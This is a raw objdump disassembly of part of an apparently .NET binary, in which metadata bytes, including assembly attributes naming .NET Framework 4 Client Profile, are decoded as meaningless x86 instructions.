  40c34c:	06                   	push   %es
  40c34d:	1c 02                	sbb    $0x2,%al
  40c34f:	06                   	push   %es
  40c350:	08 04 00             	or     %al,(%eax,%eax,1)
  40c353:	00 12                	add    %dl,(%edx)
  40c355:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c35a:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c360:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c366:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c369:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c36f:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c375:	0a 04 00             	or     (%eax,%eax,1),%al
  40c378:	01 01                	add    %eax,(%ecx)
  40c37a:	0a 04 00             	or     (%eax,%eax,1),%al
  40c37d:	00 12                	add    %dl,(%edx)
  40c37f:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c384:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c38a:	02 03                	add    (%ebx),%al
  40c38c:	00 00                	add    %al,(%eax)
  40c38e:	1c 03                	sbb    $0x3,%al
  40c390:	00 00                	add    %al,(%eax)
  40c392:	08 04 00             	or     %al,(%eax,%eax,1)
  40c395:	01 01                	add    %eax,(%ecx)
  40c397:	08 04 00             	or     %al,(%eax,%eax,1)
  40c39a:	01 02                	add    %eax,(%edx)
  40c39c:	0e                   	push   %cs
  40c39d:	0a 00                	or     (%eax),%al
  40c39f:	04 02                	add    $0x2,%al
  40c3a1:	1c 12                	sbb    $0x12,%al
  40c3a3:	19 12                	sbb    %edx,(%edx)
  40c3a5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c3aa:	01 01                	add    %eax,(%ecx)
  40c3ac:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c3b2:	1c 04                	sbb    $0x4,%al
  40c3b4:	08 00                	or     %al,(%eax)
  40c3b6:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c3bc:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c3bf:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c3c5:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c3c8:	00 12                	add    %dl,(%edx)
  40c3ca:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c3cf:	03 08                	add    (%eax),%ecx
  40c3d1:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c3d4:	08 00                	or     %al,(%eax)
  40c3d6:	08 03                	or     %al,(%ebx)
  40c3d8:	06                   	push   %es
  40c3d9:	12 29                	adc    (%ecx),%ch
  40c3db:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c3e0:	0e                   	push   %cs
  40c3e1:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c3e6:	05 06 00 01 1d       	add    $0x1d010006,%eax
  40c3eb:	05 1d 05 05 00       	add    $0x5051d,%eax
  40c3f0:	01 1d 05 0a 05 00    	add    %ebx,0x50a05
  40c3f6:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c3fc:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c402:	01 1d 05 0d 07 06    	add    %ebx,0x6070d05
  40c408:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c40d:	20 09                	and    %cl,(%ecx)
  40c40f:	20 01                	and    %al,(%ecx)
  40c411:	01 15 12 31 01 12    	add    %edx,0x12013112
  40c417:	20 03                	and    %al,(%ebx)
  40c419:	20 00                	and    %al,(%eax)
  40c41b:	1c 03                	sbb    $0x3,%al
  40c41d:	20 00                	and    %al,(%eax)
  40c41f:	02 03                	add    (%ebx),%al
  40c421:	28 00                	sub    %al,(%eax)
  40c423:	1c 03                	sbb    $0x3,%al
  40c425:	06                   	push   %es
  40c426:	12 20                	adc    (%eax),%ah
  40c428:	0b 20                	or     (%eax),%esp
  40c42a:	02 01                	add    (%ecx),%al
  40c42c:	12 20                	adc    (%eax),%ah
  40c42e:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c433:	20 04 20             	and    %al,(%eax,%eiz,1)
  40c436:	00 12                	add    %dl,(%edx)
  40c438:	20 05 20 01 12 20    	and    %al,0x20120120
  40c43e:	0e                   	push   %cs
  40c43f:	05 20 01 12 20       	add    $0x20120120,%eax
  40c444:	0a 05 20 01 12 20    	or     0x20120120,%al
  40c44a:	0d 05 20 01 12       	or     $0x12012005,%eax
  40c44f:	20 08                	and    %cl,(%eax)
  40c451:	03 20                	add    (%eax),%esp
  40c453:	00 08                	add    %cl,(%eax)
  40c455:	05 28 01 12 20       	add    $0x20120128,%eax
  40c45a:	08 03                	or     %al,(%ebx)
  40c45c:	28 00                	sub    %al,(%eax)
  40c45e:	08 03                	or     %al,(%ebx)
  40c460:	06                   	push   %es
  40c461:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40c464:	06                   	push   %es
  40c465:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40c468:	20 01                	and    %al,(%ecx)
  40c46a:	01 0e                	add    %ecx,(%esi)
  40c46c:	04 20                	add    $0x20,%al
  40c46e:	01 08                	add    %ecx,(%eax)
  40c470:	0e                   	push   %cs
  40c471:	05 20 01 01 12       	add    $0x12010120,%eax
  40c476:	39 04 20             	cmp    %eax,(%eax,%eiz,1)
  40c479:	01 01                	add    %eax,(%ecx)
  40c47b:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c47e:	01 01                	add    %eax,(%ecx)
  40c480:	0b 03                	or     (%ebx),%eax
  40c482:	20 00                	and    %al,(%eax)
  40c484:	0b 03                	or     (%ebx),%eax
  40c486:	20 00                	and    %al,(%eax)
  40c488:	0a 03                	or     (%ebx),%al
  40c48a:	20 00                	and    %al,(%eax)
  40c48c:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c491:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c496:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c49b:	01 0e                	add    %ecx,(%esi)
  40c49d:	0e                   	push   %cs
  40c49e:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c4a3:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c4a6:	01 02                	add    %eax,(%edx)
  40c4a8:	0e                   	push   %cs
  40c4a9:	03 20                	add    (%eax),%esp
  40c4ab:	00 0e                	add    %cl,(%esi)
  40c4ad:	04 20                	add    $0x20,%al
  40c4af:	01 01                	add    %eax,(%ecx)
  40c4b1:	02 04 20             	add    (%eax,%eiz,1),%al
  40c4b4:	01 01                	add    %eax,(%ecx)
  40c4b6:	0c 04                	or     $0x4,%al
  40c4b8:	20 01                	and    %al,(%ecx)
  40c4ba:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c4c0:	1c 04                	sbb    $0x4,%al
  40c4c2:	20 00                	and    %al,(%eax)
  40c4c4:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c4c7:	20 00                	and    %al,(%eax)
  40c4c9:	12 2d 03 28 00 0e    	adc    0xe002803,%ch
  40c4cf:	03 28                	add    (%eax),%ebp
  40c4d1:	00 0a                	add    %cl,(%edx)
  40c4d3:	03 28                	add    (%eax),%ebp
  40c4d5:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c4db:	1c 04                	sbb    $0x4,%al
  40c4dd:	28 00                	sub    %al,(%eax)
  40c4df:	11 24 04             	adc    %esp,(%esp,%eax,1)
  40c4e2:	00 00                	add    %al,(%eax)
  40c4e4:	00 00                	add    %al,(%eax)
  40c4e6:	04 01                	add    $0x1,%al
  40c4e8:	00 00                	add    %al,(%eax)
  40c4ea:	00 04 02             	add    %al,(%edx,%eax,1)
  40c4ed:	00 00                	add    %al,(%eax)
  40c4ef:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c4f2:	00 00                	add    %al,(%eax)
  40c4f4:	00 04 04             	add    %al,(%esp,%eax,1)
  40c4f7:	00 00                	add    %al,(%eax)
  40c4f9:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c500:	06                   	push   %es
  40c501:	00 00                	add    %al,(%eax)
  40c503:	00 04 07             	add    %al,(%edi,%eax,1)
  40c506:	00 00                	add    %al,(%eax)
  40c508:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c50b:	00 00                	add    %al,(%eax)
  40c50d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c510:	00 00                	add    %al,(%eax)
  40c512:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c515:	00 00                	add    %al,(%eax)
  40c517:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c51a:	00 00                	add    %al,(%eax)
  40c51c:	00 06                	add    %al,(%esi)
  40c51e:	00 02                	add    %al,(%edx)
  40c520:	0e                   	push   %cs
  40c521:	12 39                	adc    (%ecx),%bh
  40c523:	08 05 00 01 0e 12    	or     %al,0x120e0100
  40c529:	39 06                	cmp    %eax,(%esi)
  40c52b:	00 02                	add    %al,(%edx)
  40c52d:	0e                   	push   %cs
  40c52e:	05 12 39 05 00       	add    $0x53912,%eax
  40c533:	01 01                	add    %eax,(%ecx)
  40c535:	12 39                	adc    (%ecx),%bh
  40c537:	06                   	push   %es
  40c538:	00 02                	add    %al,(%edx)
  40c53a:	01 12                	add    %edx,(%edx)
  40c53c:	39 0e                	cmp    %ecx,(%esi)
  40c53e:	07                   	pop    %es
  40c53f:	00 02                	add    %al,(%edx)
  40c541:	01 12                	add    %edx,(%edx)
  40c543:	39 1d 05 06 00 02    	cmp    %ebx,0x2000605
  40c549:	01 12                	add    %edx,(%edx)
  40c54b:	39 0d 06 00 02 01    	cmp    %ecx,0x1020006
  40c551:	12 39                	adc    (%ecx),%bh
  40c553:	0c 06                	or     $0x6,%al
  40c555:	00 02                	add    %al,(%edx)
  40c557:	01 12                	add    %edx,(%edx)
  40c559:	39 02                	cmp    %eax,(%edx)
  40c55b:	06                   	push   %es
  40c55c:	00 02                	add    %al,(%edx)
  40c55e:	01 12                	add    %edx,(%edx)
  40c560:	39 0b                	cmp    %ecx,(%ebx)
  40c562:	06                   	push   %es
  40c563:	00 02                	add    %al,(%edx)
  40c565:	01 12                	add    %edx,(%edx)
  40c567:	39 0a                	cmp    %ecx,(%edx)
  40c569:	04 00                	add    $0x0,%al
  40c56b:	01 18                	add    %ebx,(%eax)
  40c56d:	0e                   	push   %cs
  40c56e:	06                   	push   %es
  40c56f:	00 02                	add    %al,(%edx)
  40c571:	02 18                	add    (%eax),%bl
  40c573:	10 02                	adc    %al,(%edx)
  40c575:	05 20 01 0e 12       	add    $0x120e0120,%eax
  40c57a:	41                   	inc    %ecx
  40c57b:	03 00                	add    (%eax),%eax
  40c57d:	00 0e                	add    %cl,(%esi)
  40c57f:	04 00                	add    $0x0,%al
  40c581:	01 0e                	add    %ecx,(%esi)
  40c583:	0e                   	push   %cs
  40c584:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c58a:	d5 0a                	aad    $0xa
  40c58c:	3a 06                	cmp    (%esi),%al
  40c58e:	00 01                	add    %al,(%ecx)
  40c590:	12 45 12             	adc    0x12(%ebp),%al
  40c593:	49                   	dec    %ecx
  40c594:	06                   	push   %es
  40c595:	00 01                	add    %al,(%ecx)
  40c597:	11 48 11             	adc    %ecx,0x11(%eax)
  40c59a:	48                   	dec    %eax
  40c59b:	02 06                	add    (%esi),%al
  40c59d:	09 03                	or     %eax,(%ebx)
  40c59f:	06                   	push   %es
  40c5a0:	11 48 04             	adc    %ecx,0x4(%eax)
  40c5a3:	00 00                	add    %al,(%eax)
  40c5a5:	00 80 03 06 12 4d    	add    %al,0x4d120603(%eax)
  40c5ab:	06                   	push   %es
  40c5ac:	00 02                	add    %al,(%edx)
  40c5ae:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c5b1:	51                   	push   %ecx
  40c5b2:	06                   	push   %es
  40c5b3:	00 03                	add    %al,(%ebx)
  40c5b5:	01 09                	add    %ecx,(%ecx)
  40c5b7:	09 09                	or     %ecx,(%ecx)
  40c5b9:	05 00 02 02 0e       	add    $0xe020200,%eax
  40c5be:	0e                   	push   %cs
  40c5bf:	05 00 01 01 12       	add    $0x12010100,%eax
  40c5c4:	20 04 00             	and    %al,(%eax,%eax,1)
  40c5c7:	01 01                	add    %eax,(%ecx)
  40c5c9:	0e                   	push   %cs
  40c5ca:	18 06                	sbb    %al,(%esi)
  40c5cc:	15 12 55 01 15       	adc    $0x15015512,%eax
  40c5d1:	12 59 0a             	adc    0xa(%ecx),%bl
  40c5d4:	12 5d 1c             	adc    0x1c(%ebp),%bl
  40c5d7:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c5dd:	05 12 4d 0e 0e       	add    $0xe0e4d12,%eax
  40c5e2:	0e                   	push   %cs
  40c5e3:	04 20                	add    $0x20,%al
  40c5e5:	00 00                	add    %al,(%eax)
  40c5e7:	00 04 40             	add    %al,(%eax,%eax,2)
  40c5ea:	00 00                	add    %al,(%eax)
  40c5ec:	00 04 10             	add    %al,(%eax,%edx,1)
  40c5ef:	00 00                	add    %al,(%eax)
  40c5f1:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c5f4:	01 0e                	add    %ecx,(%esi)
  40c5f6:	0e                   	push   %cs
  40c5f7:	06                   	push   %es
  40c5f8:	20 01                	and    %al,(%ecx)
  40c5fa:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c5ff:	20 02                	and    %al,(%edx)
  40c601:	02 1d 05 1d 05 03    	add    0x3051d05,%bl
  40c607:	06                   	push   %es
  40c608:	11 74 03 06          	adc    %esi,0x6(%ebx,%eax,1)
  40c60c:	11 70 04             	adc    %esi,0x4(%eax)
  40c60f:	20 01                	and    %al,(%ecx)
  40c611:	01 08                	add    %ecx,(%eax)
  40c613:	08 01                	or     %al,(%ecx)
  40c615:	00 08                	add    %cl,(%eax)
  40c617:	00 00                	add    %al,(%eax)
  40c619:	00 00                	add    %al,(%eax)
  40c61b:	00 1e                	add    %bl,(%esi)
  40c61d:	01 00                	add    %eax,(%eax)
  40c61f:	01 00                	add    %eax,(%eax)
  40c621:	54                   	push   %esp
  40c622:	02 16                	add    (%esi),%dl
  40c624:	57                   	push   %edi
  40c625:	72 61                	jb     0x40c688
  40c627:	70 4e                	jo     0x40c677
  40c629:	6f                   	outsl  %ds:(%esi),(%dx)
  40c62a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c62b:	45                   	inc    %ebp
  40c62c:	78 63                	js     0x40c691
  40c62e:	65 70 74             	gs jo  0x40c6a5
  40c631:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c638:	77 73                	ja     0x40c6ad
  40c63a:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c640:	71 08                	jno    0x40c64a
  40c642:	01 00                	add    %eax,(%eax)
  40c644:	02 00                	add    (%eax),%al
  40c646:	00 00                	add    %al,(%eax)
  40c648:	00 00                	add    %al,(%eax)
  40c64a:	05 01 00 00 00       	add    $0x1,%eax
  40c64f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c652:	00 07                	add    %al,(%edi)
  40c654:	31 2e                	xor    %ebp,(%esi)
  40c656:	30 2e                	xor    %ch,(%esi)
  40c658:	30 2e                	xor    %ch,(%esi)
  40c65a:	30 00                	xor    %al,(%eax)
  40c65c:	00 65 01             	add    %ah,0x1(%ebp)
  40c65f:	00 29                	add    %ch,(%ecx)
  40c661:	2e 4e                	cs dec %esi
  40c663:	45                   	inc    %ebp
  40c664:	54                   	push   %esp
  40c665:	46                   	inc    %esi
  40c666:	72 61                	jb     0x40c6c9
  40c668:	6d                   	insl   (%dx),%es:(%edi)
  40c669:	65 77 6f             	gs ja  0x40c6db
  40c66c:	72 6b                	jb     0x40c6d9
  40c66e:	2c 56                	sub    $0x56,%al
  40c670:	65 72 73             	gs jb  0x40c6e6
  40c673:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c67a:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c67d:	72 6f                	jb     0x40c6ee
  40c67f:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c686:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c68d:	0e                   	push   %cs
  40c68e:	14 46                	adc    $0x46,%al
  40c690:	72 61                	jb     0x40c6f3
  40c692:	6d                   	insl   (%dx),%es:(%edi)
  40c693:	65 77 6f             	gs ja  0x40c705
  40c696:	72 6b                	jb     0x40c703
  40c698:	44                   	inc    %esp
  40c699:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c6a0:	61                   	popa
  40c6a1:	6d                   	insl   (%dx),%es:(%edi)
  40c6a2:	65 1f                	gs pop %ds
  40c6a4:	2e 4e                	cs dec %esi
  40c6a6:	45                   	inc    %ebp
  40c6a7:	54                   	push   %esp
  40c6a8:	20 46 72             	and    %al,0x72(%esi)
  40c6ab:	61                   	popa
  40c6ac:	6d                   	insl   (%dx),%es:(%edi)
  40c6ad:	65 77 6f             	gs ja  0x40c71f
  40c6b0:	72 6b                	jb     0x40c71d
  40c6b2:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c6b5:	43                   	inc    %ebx
  40c6b6:	6c                   	insb   (%dx),%es:(%edi)
  40c6b7:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c6be:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6bf:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c6c6:	04 49                	add    $0x49,%al
  40c6c8:	74 65                	je     0x40c72f
  40c6ca:	6d                   	insl   (%dx),%es:(%edi)
  40c6cb:	00 00                	add    %al,(%eax)
  40c6cd:	03 07                	add    (%edi),%eax
  40c6cf:	01 08                	add    %ecx,(%eax)
  40c6d1:	04 00                	add    $0x0,%al
  40c6d3:	01 08                	add    %ecx,(%eax)
  40c6d5:	0e                   	push   %cs
  40c6d6:	05 20 02 08 08       	add    $0x8080220,%eax
  40c6db:	08 03                	or     %al,(%ebx)
  40c6dd:	07                   	pop    %es
  40c6de:	01 02                	add    %eax,(%edx)
  40c6e0:	05 00 00 12 80       	add    $0x80120000,%eax
  40c6e5:	b5 05                	mov    $0x5,%ch
  40c6e7:	20 01                	and    %al,(%ecx)
  40c6e9:	0e                   	push   %cs
  40c6ea:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c6ef:	12 80 b9 05 20 00    	adc    0x2005b9(%eax),%al
  40c6f5:	12 80 bd 05 20 01    	adc    0x12005bd(%eax),%al
  40c6fb:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c700:	03 02                	add    (%edx),%eax
  40c702:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c707:	14 07                	adc    $0x7,%al
  40c709:	08 0e                	or     %cl,(%esi)
  40c70b:	08 1d 12 80 cd 08    	or     %bl,0x8cd8012
  40c711:	12 80 cd 12 80 d1    	adc    -0x2e7fed33(%eax),%al
  40c717:	12 80 d5 1d 0e 0c    	adc    0xc0e1dd5(%eax),%al
  40c71d:	20 03                	and    %al,(%ebx)
  40c71f:	01 11                	add    %edx,(%ecx)
  40c721:	80 d9 11             	sbb    $0x11,%cl
  40c724:	80 dd 11             	sbb    $0x11,%ch
  40c727:	80 e1 06             	and    $0x6,%cl
  40c72a:	20 01                	and    %al,(%ecx)
  40c72c:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c731:	20 01                	and    %al,(%ecx)
  40c733:	08 08                	or     %cl,(%eax)
  40c735:	07                   	pop    %es
  40c736:	00 01                	add    %al,(%ecx)
  40c738:	1d 12 80 cd 0e       	sbb    $0xecd8012,%eax
  40c73d:	07                   	pop    %es
  40c73e:	20 02                	and    %al,(%edx)
  40c740:	01 12                	add    %edx,(%edx)
  40c742:	80 cd 08             	or     $0x8,%ch
  40c745:	06                   	push   %es
  40c746:	20 01                	and    %al,(%ecx)
  40c748:	01 12                	add    %edx,(%edx)
  40c74a:	80 f1 09             	xor    $0x9,%cl
  40c74d:	20 02                	and    %al,(%edx)
  40c74f:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c754:	80 f5 06             	xor    $0x6,%ch
  40c757:	20 02                	and    %al,(%edx)
  40c759:	01 12                	add    %edx,(%edx)
  40c75b:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c760:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c763:	09 20                	or     %esp,(%eax)
  40c765:	03 01                	add    (%ecx),%eax
  40c767:	12 39                	adc    (%ecx),%bh
  40c769:	02 12                	add    (%edx),%dl
  40c76b:	81 01 05 20 00 12    	addl   $0x12002005,(%ecx)
  40c771:	81 05 0b 20 04 01 0e 	addl   $0x981120e,0x104200b
  40c778:	12 81 09 
  40c77b:	11 81 0d 02 09 20    	adc    %eax,0x2009020d(%ecx)
  40c781:	04 01                	add    $0x1,%al
  40c783:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c789:	0c 20                	or     $0x20,%al
  40c78b:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c790:	08 08                	or     %cl,(%eax)
  40c792:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c798:	01 11                	add    %edx,(%ecx)
  40c79a:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c7a0:	02 12                	add    (%edx),%dl
  40c7a2:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c7a5:	02 08                	add    (%eax),%cl
  40c7a7:	08 05 20 01 08 12    	or     %al,0x12080120
  40c7ad:	25 06 00 02 08       	and    $0x8020006,%eax
  40c7b2:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c7b7:	03 08                	add    (%eax),%ecx
  40c7b9:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c7be:	20 01                	and    %al,(%ecx)
  40c7c0:	01 12                	add    %edx,(%edx)
  40c7c2:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c7c8:	1c 0c                	sbb    $0xc,%al
  40c7ca:	07                   	pop    %es
  40c7cb:	06                   	push   %es
  40c7cc:	1c 02                	sbb    $0x2,%al
  40c7ce:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c7d3:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c7d9:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c7dc:	02 07                	add    (%edi),%al
  40c7de:	20 02                	and    %al,(%edx)
  40c7e0:	02 08                	add    (%eax),%cl
  40c7e2:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c7e8:	01 1d 05 08 08 05    	add    %ebx,0x5080805
  40c7ee:	00 02                	add    %al,(%edx)
  40c7f0:	0e                   	push   %cs
  40c7f1:	0e                   	push   %cs
  40c7f2:	0e                   	push   %cs
  40c7f3:	09 07                	or     %eax,(%edi)
  40c7f5:	04 12                	add    $0x12,%al
  40c7f7:	81 3d 1d 05 08 05 05 	cmpl   $0xe020005,0x508051d
  40c7fe:	00 02 0e 
  40c801:	0e                   	push   %cs
  40c802:	1c 06                	sbb    $0x6,%al
  40c804:	20 01                	and    %al,(%ecx)
  40c806:	12 81 3d 0e 06 07    	adc    0x7060e3d(%ecx),%al
  40c80c:	03 1d 05 08 08 06    	add    0x6080805,%ebx
  40c812:	15 12 31 01 12       	adc    $0x12013112,%eax
  40c817:	20 05 20 01 13 00    	and    %al,0x130120
  40c81d:	08 04 07             	or     %al,(%edi,%eax,1)
  40c820:	01 12                	add    %edx,(%edx)
  40c822:	20 05 20 01 01 13    	and    %al,0x13010120
  40c828:	00 0e                	add    %cl,(%esi)
  40c82a:	07                   	pop    %es
  40c82b:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c830:	11 81 41 01 12 20    	adc    %eax,0x20120141(%ecx)
  40c836:	12 20                	adc    (%eax),%ah
  40c838:	09 20                	or     %esp,(%eax)
  40c83a:	00 15 11 81 41 01    	add    %dl,0x1418111
  40c840:	13 00                	adc    (%eax),%eax
  40c842:	07                   	pop    %es
  40c843:	15 11 81 41 01       	adc    $0x1418111,%eax
  40c848:	12 20                	adc    (%eax),%ah
  40c84a:	04 20                	add    $0x20,%al
  40c84c:	00 13                	add    %dl,(%ebx)
  40c84e:	00 07                	add    %al,(%edi)
  40c850:	07                   	pop    %es
  40c851:	04 05                	add    $0x5,%al
  40c853:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  40c858:	20 01                	and    %al,(%ecx)
  40c85a:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c860:	24 04                	and    $0x4,%al
  40c862:	00 01                	add    %al,(%ecx)
  40c864:	0b 0a                	or     (%edx),%ecx
  40c866:	04 00                	add    $0x0,%al
  40c868:	01 0b                	add    %ecx,(%ebx)
  40c86a:	0e                   	push   %cs
  40c86b:	04 00                	add    $0x0,%al
  40c86d:	01 0b                	add    %ecx,(%ebx)
  40c86f:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c874:	0c 06                	or     $0x6,%al
  40c876:	00 01                	add    %al,(%ecx)
  40c878:	0b 11                	or     (%ecx),%edx
  40c87a:	81 55 04 00 01 0a 0a 	adcl   $0xa0a0100,0x4(%ebp)
  40c881:	04 00                	add    $0x0,%al
  40c883:	01 0a                	add    %ecx,(%edx)
  40c885:	0e                   	push   %cs
  40c886:	04 00                	add    $0x0,%al
  40c888:	01 0a                	add    %ecx,(%edx)
  40c88a:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c88f:	0c 06                	or     $0x6,%al
  40c891:	00 01                	add    %al,(%ecx)
  40c893:	0a 11                	or     (%ecx),%dl
  40c895:	81 55 04 00 01 0d 0a 	adcl   $0xa0d0100,0x4(%ebp)
  40c89c:	04 00                	add    $0x0,%al
  40c89e:	01 0d 0e 07 07 02    	add    %ecx,0x207070e
  40c8a4:	11 24 11             	adc    %esp,(%ecx,%edx,1)
  40c8a7:	81 55 05 00 01 1d 05 	adcl   $0x51d0100,0x5(%ebp)
  40c8ae:	0c 02                	or     $0x2,%al
  40c8b0:	1d 05 07 07 02       	sbb    $0x2070705,%eax
  40c8b5:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40c8ba:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c8bf:	11 81 61 11 81 65    	adc    %eax,0x65811161(%ecx)
  40c8c5:	11 81 69 07 20 02    	adc    %eax,0x2200769(%ecx)
  40c8cb:	01 0e                	add    %ecx,(%esi)
  40c8cd:	11 81 61 0b 07 06    	adc    %eax,0x6070b61(%ecx)
  40c8d3:	12 20                	adc    (%eax),%ah
  40c8d5:	12 20                	adc    (%eax),%ah
  40c8d7:	1d 0e 0e 08 08       	sbb    $0x8080e0e,%eax
  40c8dc:	09 00                	or     %eax,(%eax)
  40c8de:	02 01                	add    (%ecx),%al
  40c8e0:	12 81 71 11 81 75    	adc    0x75811171(%ecx),%al
  40c8e6:	05 07 01 12 81       	add    $0x81120107,%eax
  40c8eb:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c8f0:	81 59 06 00 02 07 1d 	sbbl   $0x1d070200,0x6(%ecx)
  40c8f7:	05 08 06 00 02       	add    $0x2000608,%eax
  40c8fc:	0c 1d                	or     $0x1d,%al
  40c8fe:	05 08 06 00 02       	add    $0x2000608,%eax
  40c903:	0d 1d 05 08 06       	or     $0x608051d,%eax
  40c908:	00 02                	add    %al,(%edx)
  40c90a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c910:	02 0b                	add    (%ebx),%cl
  40c912:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c917:	02 06                	add    (%esi),%al
  40c919:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c91e:	02 0a                	add    (%edx),%cl
  40c920:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c925:	03 12                	add    (%edx),%edx
  40c927:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c92e:	07 02 12 
  40c931:	20 02                	and    %al,(%edx)
  40c933:	04 07                	add    $0x7,%al
  40c935:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c93b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c940:	04 1d                	add    $0x1d,%al
  40c942:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c947:	06                   	push   %es
  40c948:	07                   	pop    %es
  40c949:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c94f:	00 01                	add    %al,(%ecx)
  40c951:	1d 05 0b 1c 07       	sbb    $0x71c0b05,%eax
  40c956:	0c 12                	or     $0x12,%al
  40c958:	81 7d 1d 05 1d 05 0e 	cmpl   $0xe051d05,0x1d(%ebp)
  40c95f:	08 1d 12 41 08 12    	or     %bl,0x12084112
  40c965:	41                   	inc    %ecx
  40c966:	12 41 12             	adc    0x12(%ecx),%al
  40c969:	81 81 12 81 85 12 81 	addl   $0x48981,0x12858112(%ecx)
  40c970:	89 04 00 
  40c973:	00 12                	add    %dl,(%edx)
  40c975:	41                   	inc    %ecx
  40c976:	05 20 00 12 81       	add    $0x81120020,%eax
  40c97b:	91                   	xchg   %eax,%ecx
  40c97c:	05 00 00 1d 12       	add    $0x121d0000,%eax
  40c981:	41                   	inc    %ecx
  40c982:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c987:	0e                   	push   %cs
  40c988:	06                   	push   %es
  40c989:	20 01                	and    %al,(%ecx)
  40c98b:	01 11                	add    %edx,(%ecx)
  40c98d:	81 99 06 20 01 01 12 	sbbl   $0x4818112,0x1012006(%ecx)
  40c994:	81 81 04 
  40c997:	06                   	push   %es
  40c998:	12 81 85 09 20 02    	adc    0x2200985(%ecx),%al
